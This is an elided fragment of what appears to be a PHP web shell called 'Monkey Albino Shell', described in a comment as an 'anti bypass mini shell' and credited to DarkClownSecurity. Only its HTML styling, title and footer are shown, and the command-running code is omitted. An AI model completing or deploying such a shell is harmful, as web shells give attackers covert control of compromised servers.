<?php
          ...
          /**
            * responsive anti bypass mini shell
          **/
...
<head>
  ...
  <link href="https://ibnudz.github.io/assets/css/hacker.css" rel="stylesheet">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  
  <title>Monkey Albino Shell</title>
</head>
  ...
  <div class="container-fluid">
    <div class="py-3" id="main">
      <div class="box shadow bg-dark p-4 rounded-3">
      	<div class="info mb-3">
          <center><h1 style="color:white;">Monkey Albino</h1></center>
        ...
        <div class="text-light">&#169; <font>DarkClownSecurity</font> <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
      </div>
    </div>
  </div>
